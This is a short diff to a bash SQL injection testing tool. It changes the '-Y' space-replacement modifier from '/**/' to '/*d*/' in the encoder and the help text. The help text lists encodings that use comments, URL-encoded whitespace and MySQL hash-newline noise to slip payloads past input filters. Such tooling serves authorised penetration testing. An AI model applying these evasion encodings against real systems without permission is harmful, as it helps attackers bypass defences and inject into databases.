@@ -23,7 +23,7 @@ encodeme()
 inputbuffer=$encodeinput
 #modify at the SQL layer first
 if [ true = "$Y" ] ; then
-	inputbuffer=`echo $inputbuffer | replace " " "/**/"`
+	inputbuffer=`echo $inputbuffer | replace " " "/*d*/"`
 fi
 
 if [ true = "$E" ] ; then
@@ -2912,7 +2912,7 @@ if [ true = "$h" ] || ["$1" == ""] 2>/dev/null ; then
         echo "  -C <path to payload list text file> Use a custom payload list. Where the character 'X' is included in a payload, it may be replaced with a time delay value."
         #echo "  -Y XSS injection (very basic!)"
 	echo "Optional payload modifiers:             Before     After                         DBMS       "
-	echo "  -Y Inline SQL comment space           ' '        '/**/'                        All        "
+	echo "  -Y Inline SQL comment space           ' '        '/*d*/'                       All        "
 	echo "  -N Intermediary chars space           ' '        '%2f%2a%0B%0C%0D%0A%09%2a%2f' All        "              
 	echo "  -p Hash+noise+newline space           ' '        '#ihffeg%0a'                  MYSQL      "
 	echo "  -w Comment+newline space              ' '        '%2d%2d%0a'                   MYSQL,MSSQL"
